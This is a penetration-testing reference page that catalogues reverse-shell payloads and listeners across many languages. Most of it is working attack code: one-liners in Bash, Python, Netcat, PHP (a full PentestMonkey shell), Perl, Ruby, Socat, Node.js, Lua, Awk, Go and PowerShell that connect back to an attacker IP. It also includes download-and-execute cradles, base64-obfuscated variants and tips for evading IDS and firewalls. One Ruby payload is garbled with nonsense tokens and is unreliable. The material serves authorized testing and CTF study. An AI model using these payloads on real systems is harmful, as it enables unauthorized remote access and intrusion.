---
title: Reverse Shells
description: Complete reverse shell payload reference with listener setup, shell generation across every language, shell stabilization techniques, and web shells for penetration testing.
navigation:
  icon: i-lucide-terminal
  title: Reverse Shells
---

A reverse shell is a connection initiated **from the target machine back to the attacker**, giving the attacker an interactive command-line interface on the target. Unlike a bind shell (where the attacker connects TO the target), reverse shells bypass firewalls and NAT because the connection is **outbound** from the target — most firewalls allow outbound traffic while blocking unsolicited inbound connections.

Reverse shells are the **most common method** for establishing interactive access during penetration testing, CTF challenges, and red team operations after exploiting a vulnerability.

::note
Replace `10.10.14.5` with your attacker IP and `4444` with your listener port throughout all payloads. All commands assume the target can reach your attacker machine on the specified port.
::

---

## :icon{name="i-lucide-lightbulb"} How Reverse Shells Work

### The Connection Flow

```
┌──────────────┐                          ┌──────────────┐
│   ATTACKER   │                          │    TARGET    │
│  10.10.14.5  │◄─── TCP Connection ──────│  10.10.16.5  │
│              │                          │              │
│  nc -lvnp    │     Target initiates     │  bash -i >& │
│    4444      │◄─── connection TO ────────│  /dev/tcp/   │
│              │     attacker:4444        │  10.10.14.5  │
│  Receives    │                          │  /4444       │
│  shell I/O   │◄─── stdin/stdout/stderr──│              │
└──────────────┘                          └──────────────┘
     LISTENER                               PAYLOAD
```

### Reverse Shell vs Bind Shell

| Feature | Reverse Shell | Bind Shell |
| ------- | ------------- | ---------- |
| **Direction** | Target → Attacker | Attacker → Target |
| **Firewall Bypass** | :badge{label="Yes" color="green"} Outbound allowed | :badge{label="No" color="red"} Inbound blocked |
| **NAT Friendly** | :badge{label="Yes" color="green"} | :badge{label="No" color="red"} |
| **Attacker Setup** | Listener required | No listener needed |
| **Detection** | Outbound connection | Listening port on target |
| **Preferred** | :badge{label="Almost Always" color="green"} | Rare/specific scenarios |

### The Three Requirements

Every reverse shell requires three things:

::steps{level="4"}

#### Listener on Attacker

A program listening for incoming connections on a specific port. The listener receives the target's shell I/O (stdin, stdout, stderr).

#### Payload on Target

Code executing on the target that creates a TCP connection back to the attacker and redirects the shell's input/output through that connection.

#### Network Connectivity

The target must be able to reach the attacker's IP address on the listener port. Firewalls, network segmentation, and egress filtering can block this.

::

::tip
**Port selection matters.** Use ports that are commonly allowed through firewalls:
- **443** (HTTPS) — almost always allowed
- **80** (HTTP) — usually allowed
- **53** (DNS) — often allowed
- **8080** (HTTP alt) — commonly allowed
- Avoid high random ports — they're more likely filtered
::

---

## :icon{name="i-lucide-radio"} Listener Setup (Attacker Side)

Before sending any reverse shell payload, you must **start a listener** on your attacker machine. The listener waits for the incoming connection from the target.

### Netcat Listener

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Listener" color="blue"}
  :badge{label="Netcat" color="green"}
  :badge{label="Most Common" color="orange"}
  :badge{label="Simple" color="red"}
::

![Netcat](https://img.shields.io/badge/Netcat-333333?style=for-the-badge&logo=gnubash&logoColor=white)

Netcat (`nc`) is the simplest and most commonly used listener. The flags are:
- `-l` — listen mode
- `-v` — verbose output (shows connection info)
- `-n` — no DNS resolution (faster)
- `-p` — specify port number

```bash [Basic Netcat Listener]
nc -lvnp 4444
```

```bash [Common Port Listeners]
# Port 443 — HTTPS (best firewall bypass)
sudo nc -lvnp 443

# Port 80 — HTTP
sudo nc -lvnp 80

# Port 53 — DNS
sudo nc -lvnp 53

# Note: ports below 1024 require sudo/root
```

::note
Ports below **1024** are privileged on Linux and require `sudo` or root access to bind. Use port 443 whenever possible — it provides the best chance of bypassing egress firewalls.
::

---

### rlwrap + Netcat (Enhanced)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Listener" color="blue"}
  :badge{label="rlwrap" color="green"}
  :badge{label="Arrow Keys" color="orange"}
  :badge{label="History" color="red"}
  :badge{label="Recommended" color="purple"}
::

`rlwrap` wraps any command with readline functionality — giving you **arrow key support**, **command history**, and **line editing** in your reverse shell. Without it, pressing arrow keys in a basic netcat shell produces `^[[A` escape sequences instead of scrolling through history.

```bash [Install rlwrap]
sudo apt install rlwrap -y
```

```bash [rlwrap + Netcat — Recommended]
rlwrap nc -lvnp 4444
rlwrap nc -lvnp 443
```

::tip
**Always use `rlwrap`** with your netcat listener. It makes reverse shells significantly more usable with arrow key history, even before you stabilize the shell.
::

---

### Ncat (Nmap) — SSL Encrypted Listener

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Listener" color="blue"}
  :badge{label="Ncat" color="green"}
  :badge{label="SSL/TLS" color="orange"}
  :badge{label="Encrypted" color="red"}
  :badge{label="IDS Evasion" color="purple"}
::

`ncat` (from the Nmap project) supports **SSL/TLS encryption**, making the reverse shell traffic appear as encrypted HTTPS — evading network IDS/IPS that inspect plaintext traffic.

```bash [Ncat SSL Listener]
# Generate self-signed cert (one-time)
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj '/CN=a'

# Start encrypted listener
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 443
```

```bash [Simple Ncat SSL — Auto Certificate]
# Ncat generates a certificate automatically
ncat --ssl -lvnp 443
```

---

### Socat Listener

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Listener" color="blue"}
  :badge{label="Socat" color="green"}
  :badge{label="Full TTY" color="orange"}
  :badge{label="Interactive" color="red"}
::

Socat provides the **most feature-rich** listener, including the ability to receive a fully interactive TTY shell with proper terminal handling.

```bash [Basic Socat Listener]
socat TCP-LISTEN:4444,reuseaddr -
```

```bash [Socat Full TTY Listener — Best Shell Quality]
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

```bash [Socat SSL Listener]
# Generate cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj '/CN=a'
cat key.pem cert.pem > shell.pem

# Listen with SSL
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,reuseaddr,fork STDIO
```

---

### Metasploit multi/handler

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Listener" color="blue"}
  :badge{label="Metasploit" color="green"}
  :badge{label="Meterpreter" color="orange"}
  :badge{label="Staged" color="red"}
  :badge{label="Feature Rich" color="purple"}
::

![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=for-the-badge&logo=metasploit&logoColor=white)

Metasploit's `multi/handler` is the most versatile listener — it handles staged payloads, Meterpreter sessions, and provides post-exploitation modules. Required when using `msfvenom` staged payloads.

```bash [Metasploit multi/handler]
msfconsole -q

use exploit/multi/handler

# For staged reverse TCP (most common with msfvenom)
set payload windows/x64/meterpreter/reverse_tcp
# Or for stageless:
# set payload windows/x64/shell_reverse_tcp
# Or for Linux:
# set payload linux/x64/shell_reverse_tcp

set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false

exploit -j
# -j backgrounds the listener as a job
```

```bash [Common Payload/Handler Combinations]
# Windows Meterpreter (staged)
set payload windows/x64/meterpreter/reverse_tcp

# Windows shell (stageless)
set payload windows/x64/shell_reverse_tcp

# Linux shell (stageless)
set payload linux/x64/shell_reverse_tcp

# PHP
set payload php/reverse_php

# Java
set payload java/shell_reverse_tcp
```

---

### Pwncat — Auto-Stabilizing Listener

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Listener" color="blue"}
  :badge{label="pwncat" color="green"}
  :badge{label="Auto Stabilize" color="orange"}
  :badge{label="File Transfer" color="red"}
  :badge{label="Enumeration" color="purple"}
::

![pwncat](https://img.shields.io/badge/pwncat-333333?style=for-the-badge)

`pwncat-cs` is a modern reverse shell handler that **automatically stabilizes** shells, provides file upload/download, and includes built-in enumeration modules. It turns a basic reverse shell into a fully interactive session instantly.

```bash [Install pwncat]
pip install pwncat-cs
```

```bash [pwncat Listener]
# Basic listener
pwncat-cs -lp 4444

# Listen on specific interface
pwncat-cs -l 10.10.14.5 -p 4444

# Auto-reconnect
pwncat-cs -lp 4444 --reconnect
```

::card-group
  ::card
  ---
  title: pwncat-cs
  icon: i-simple-icons-github
  to: https://github.com/calebstewart/pwncat
  target: _blank
  ---
  2.5K+ ⭐ — Post-exploitation platform with auto shell stabilization.
  ::
::

---

### Listener Quick Reference

| Listener | Command | Best For |
| -------- | ------- | -------- |
| Netcat | `nc -lvnp 4444` | Simple, quick setup |
| rlwrap + nc | `rlwrap nc -lvnp 4444` | Arrow key support |
| Ncat SSL | `ncat --ssl -lvnp 443` | Encrypted / IDS evasion |
| Socat TTY | `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:4444` | Best shell quality |
| Metasploit | `use exploit/multi/handler` | Staged payloads, Meterpreter |
| pwncat | `pwncat-cs -lp 4444` | Auto-stabilize, enum |

---

## :icon{name="i-lucide-terminal"} Linux Reverse Shell Payloads

### Bash

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Bash" color="blue"}
  :badge{label="Built-in" color="orange"}
  :badge{label="Most Reliable" color="red"}
  :badge{label="No Dependencies" color="purple"}
::

![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)

Bash reverse shells are the **most commonly used** on Linux because Bash is available on virtually every system. The `/dev/tcp` pseudo-device creates a TCP connection, and I/O redirection (`>&`, `0>&1`) connects the shell's input/output to that connection.

**How it works:** `bash -i` starts an interactive Bash shell. `>& /dev/tcp/IP/PORT` redirects both stdout and stderr to the TCP connection. `0>&1` redirects stdin from the same connection. Together, all three I/O streams flow through the network to your listener.

```bash [Bash — Most Common]
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

```bash [Bash — Alternative syntax]
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

```bash [Bash — exec redirect]
exec 5<>/dev/tcp/10.10.14.5/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

```bash [Bash — File descriptor method]
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; bash <&196 >&196 2>&196
```

```bash [Bash — Using sh instead of bash]
sh -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

```bash [Bash — One-liner for command injection]
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==}|{base64,-d}|bash'
```

::warning
The `/dev/tcp` device is a **Bash-specific feature**. It does NOT work in `sh`, `dash`, `zsh`, or other shells. If the default shell isn't Bash, explicitly call `bash -c '...'` instead.
::

---

### Python

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Windows" color="blue"}
  :badge{label="Python" color="orange"}
  :badge{label="Cross-Platform" color="red"}
  :badge{label="Very Common" color="purple"}
::

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)

Python reverse shells are extremely reliable because Python is installed on most Linux servers and many Windows systems. The `pty` module creates a proper pseudo-terminal, and the `subprocess` module provides more control over the spawned shell process.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Python 3"}
  ```bash [Python 3 — Short]
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```

  ```bash [Python 3 — With PTY (better)]
  python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
  ```

  ```bash [Python 3 — Export method]
  export RHOST="10.10.14.5";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python 2"}
  ```bash [Python 2]
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```

  ```bash [Python 2 — With PTY]
  python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python — Windows"}
  ```bash [Python — Windows target]
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe"])'
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python — Script File"}
  ```python [revshell.py]
  import socket
  import subprocess
  import os
  import pty

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("10.10.14.5", 4444))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  pty.spawn("/bin/bash")
  ```
  :::
::

---

### Netcat

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Netcat" color="blue"}
  :badge{label="Multiple Variants" color="orange"}
  :badge{label="Common" color="red"}
  :badge{label="Simple" color="purple"}
::

![Netcat](https://img.shields.io/badge/Netcat-333333?style=for-the-badge&logo=gnubash&logoColor=white)

Multiple versions of Netcat exist with different capabilities. The traditional version supports `-e` for direct execution, while the OpenBSD version (common on modern systems) does NOT. Use the named pipe method when `-e` is unavailable.

```bash [Netcat — Traditional (with -e)]
nc -e /bin/bash 10.10.14.5 4444
nc -e /bin/sh 10.10.14.5 4444
```

```bash [Netcat — OpenBSD / without -e (Named Pipe)]
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

```bash [Netcat — Alternative named pipe]
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

```bash [Ncat — with SSL encryption]
ncat --ssl 10.10.14.5 443 -e /bin/bash
```

::note
**How the named pipe works:** `mkfifo /tmp/f` creates a named pipe (FIFO). `cat /tmp/f` reads from the pipe. The output is piped to `/bin/sh -i` which executes commands. The shell's output goes through `nc` to the attacker. The attacker's input comes through `nc` and is written back to the pipe — completing the I/O loop.
::

---

### PHP

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="PHP" color="blue"}
  :badge{label="Web Servers" color="orange"}
  :badge{label="Command Injection" color="red"}
  :badge{label="Web Shells" color="purple"}
::

![PHP](https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white)

PHP reverse shells are critical for exploiting **web application vulnerabilities** — file upload, command injection, LFI/RFI, and code injection in PHP applications. PHP is the most common server-side language in web hosting environments.

::tabs
  :::tabs-item{icon="i-lucide-code" label="One-Liners"}
  ```bash [PHP — exec]
  php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

  ```bash [PHP — shell_exec]
  php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

  ```bash [PHP — system]
  php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/sh -i <&3 >&3 2>&3");'
  ```

  ```bash [PHP — passthru]
  php -r '$sock=fsockopen("10.10.14.5",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
  ```

  ```bash [PHP — proc_open]
  php -r '$sock=fsockopen("10.10.14.5",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
  ```

  ```bash [PHP — popen]
  php -r '$sock=fsockopen("10.10.14.5",4444);popen("/bin/sh -i <&3 >&3 2>&3","r");'
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="PentestMonkey Full Shell"}
  ```php [php-reverse-shell.php]
  <?php
  set_time_limit(0);
  $ip = '10.10.14.5';
  $port = 4444;

  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/bash -i';
  $daemon = 0;
  $debug = 0;

  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) { exit(1); }

  $descriptorspec = array(
      0 => array("pipe", "r"),
      1 => array("pipe", "w"),
      2 => array("pipe", "w")
  );

  $process = proc_open($shell, $descriptorspec, $pipes);
  if (!is_resource($process)) { exit(1); }

  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  while (1) {
      if (feof($sock)) { break; }
      if (feof($pipes[1])) { break; }

      $read_a = array($sock, $pipes[1], $pipes[2]);
      $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

      if (in_array($sock, $read_a)) {
          $input = fread($sock, $chunk_size);
          fwrite($pipes[0], $input);
      }
      if (in_array($pipes[1], $read_a)) {
          $input = fread($pipes[1], $chunk_size);
          fwrite($sock, $input);
      }
      if (in_array($pipes[2], $read_a)) {
          $input = fread($pipes[2], $chunk_size);
          fwrite($sock, $input);
      }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);
  ?>
  ```
  :::
::

::card-group
  ::card
  ---
  title: PentestMonkey PHP Reverse Shell
  icon: i-simple-icons-github
  to: https://github.com/pentestmonkey/php-reverse-shell
  target: _blank
  ---
  The classic PHP reverse shell — most reliable full-featured PHP shell.
  ::
::

---

### Perl

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Perl" color="blue"}
  :badge{label="Legacy Systems" color="orange"}
  :badge{label="CGI" color="red"}
::

![Perl](https://img.shields.io/badge/Perl-39457E?style=for-the-badge&logo=perl&logoColor=white)

Perl is available on many Linux systems, especially older servers and systems running CGI applications.

```bash [Perl — Short]
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash [Perl — Without /bin/sh]
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```bash [Perl — Windows]
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

### Ruby

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Ruby" color="blue"}
  :badge{label="Rails Servers" color="orange"}
::

![Ruby](https://img.shields.io/badge/Ruby-CC342D?style=for-the-badge&logo=ruby&logoColor=white)

```bash [Ruby]
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash [Ruby — Alternative]
ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.14.5","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/teleport?(IO.popen(googol,"r"){|io|c.print io.read}):c.print `#{$_}`)}' 2>/dev/null
```

```bash [Ruby — Windows]
ruby -rsocket -e 'c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

### Socat

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Socat" color="blue"}
  :badge{label="Full TTY" color="orange"}
  :badge{label="Best Shell Quality" color="red"}
  :badge{label="SSL Support" color="purple"}
::

Socat provides the **highest quality** reverse shell — a fully interactive TTY with job control, tab completion, and signal handling. The trade-off is that socat must be installed on the target (or uploaded).

```bash [Socat — Basic reverse shell]
socat TCP:10.10.14.5:4444 EXEC:/bin/bash
```

```bash [Socat — Full interactive TTY]
# Attacker listener: socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
socat TCP:10.10.14.5:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

```bash [Socat — SSL encrypted]
# Attacker: socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDIO
socat OPENSSL:10.10.14.5:443,verify=0 EXEC:/bin/bash
```

```bash [Socat — Full TTY with SSL]
# Attacker: socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 file:`tty`,raw,echo=0
socat OPENSSL:10.10.14.5:443,verify=0 EXEC:'bash -i',pty,stderr,setsid,sigint,sane
```

::tip
If socat isn't installed on the target, you can upload a **static binary**:
```bash
# Download standalone socat
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
chmod +x socat
./socat TCP:10.10.14.5:4444 EXEC:/bin/bash
```
::

---

### Node.js / JavaScript

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Node.js" color="blue"}
  :badge{label="JavaScript" color="orange"}
  :badge{label="SSJS" color="red"}
::

![Node.js](https://img.shields.io/badge/Node.js-5FA04E?style=for-the-badge&logo=nodedotjs&logoColor=white)

```bash [Node.js — require]
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/bash",[]);var client=new net.Socket();client.connect(4444,"10.10.14.5",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'
```

```bash [Node.js — Short]
node -e 'var x=require("child_process").spawn("/bin/bash",["-i"]);var net=require("net"),s=new net.Socket();s.connect(4444,"10.10.14.5");s.pipe(x.stdin);x.stdout.pipe(s);x.stderr.pipe(s);'
```

```javascript [revshell.js — Script file]
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", ["-i"]);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

### Lua / Golang / Awk / xterm

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Misc Languages" color="blue"}
  :badge{label="LOLBins" color="orange"}
  :badge{label="Fallback" color="red"}
::

Additional reverse shell payloads in less common languages — useful when standard tools are unavailable.

::code-collapse

```bash [Lua]
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.5','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Lua 5.1
lua5.1 -e 'local host, port = "10.10.14.5", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

```bash [Awk]
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.5/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

```go [Go — revshell.go]
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.5:4444");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rev.go && go run /tmp/rev.go
```

```bash [xterm — X11 forwarding]
# Attacker: Xnest :1 (or xterm)
# Attacker: xhost +targetip
xterm -display 10.10.14.5:1
```

```bash [telnet — Alternative to netcat]
rm /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | telnet 10.10.14.5 4444 > /tmp/f

# Two-port telnet
telnet 10.10.14.5 4444 | /bin/bash | telnet 10.10.14.5 4445
# Attacker needs two listeners: 4444 (commands) and 4445 (output)
```

```bash [OpenSSL — Encrypted reverse shell]
# Attacker: openssl s_server -quiet -key key.pem -cert cert.pem -port 443
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:443 > /tmp/s; rm /tmp/s
```

::

---

## :icon{name="i-lucide-monitor"} Windows Reverse Shell Payloads

### PowerShell

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="PowerShell" color="green"}
  :badge{label="Most Common" color="orange"}
  :badge{label="Built-in" color="red"}
  :badge{label="AMSI Monitored" color="purple"}
::

![PowerShell](https://img.shields.io/badge/PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white)

PowerShell is the **primary reverse shell method** on modern Windows. It's built into every Windows installation from 7/2008R2 onwards. Multiple approaches exist with different detection profiles.

::tabs
  :::tabs-item{icon="i-lucide-code" label="One-Liners"}
  ```powershell [PowerShell — TCPClient (Most Common)]
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```

  ```powershell [PowerShell — Short version]
  powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADQANAApAA==
  :: Generate with: echo -n "..." | iconv -t UTF-16LE | base64 -w0
  ```

  ```powershell [From cmd.exe]
  powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$y=([text.encoding]::ASCII).GetBytes($t);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Nishang"}
  ```powershell [Invoke-PowerShellTcp — Nishang]
  :: Download and execute Nishang reverse shell
  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')
  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444

  :: Or append to the script file before hosting:
  :: Add this line at the bottom of Invoke-PowerShellTcp.ps1:
  :: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444
  :: Then just IEX the script
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="ConPty Shell"}
  ```powershell [ConPty — Full interactive Windows shell]
  :: Requires: https://github.com/antonioCoco/ConPtyShell
  :: Attacker: stty raw -echo; (stty size; cat) | nc -lvnp 4444

  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-ConPtyShell.ps1')
  Invoke-ConPtyShell 10.10.14.5 4444
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Base64 Encoded"}
  ```bash [Generate encoded payload on attacker (Linux)]
  # Create the PowerShell reverse shell command
  COMMAND='$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

  # Encode to Base64 (UTF-16LE for PowerShell)
  echo -n "$COMMAND" | iconv -t UTF-16LE | base64 -w0
  ```

  ```powershell [Execute encoded payload on target]
  powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...
  ```
  :::
::

::card-group
  ::card
  ---
  title: Nishang
  icon: i-simple-icons-github
  to: https://github.com/samratashok/nishang
  target: _blank
  ---
  9K+ ⭐ — Offensive PowerShell framework with reverse shells, keyloggers, and post-exploitation.
  ::

  ::card
  ---
  title: ConPtyShell
  icon: i-simple-icons-github
  to: https://github.com/antonioCoco/ConPtyShell
  target: _blank
  ---
  Fully interactive reverse shell for Windows using ConPty API — the best Windows shell.
  ::
::

---

### Windows — Netcat / Ncat

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Netcat" color="green"}
  :badge{label="Upload Required" color="orange"}
  :badge{label="Simple" color="red"}
::

Netcat isn't built into Windows but is often uploaded during an engagement. Both `nc.exe` and `ncat.exe` (from Nmap) work.

```powershell [nc.exe]
nc.exe 10.10.14.5 4444 -e cmd.exe
nc.exe 10.10.14.5 4444 -e powershell.exe
```

```powershell [ncat.exe — with SSL]
ncat.exe --ssl 10.10.14.5 443 -e cmd.exe
```

---

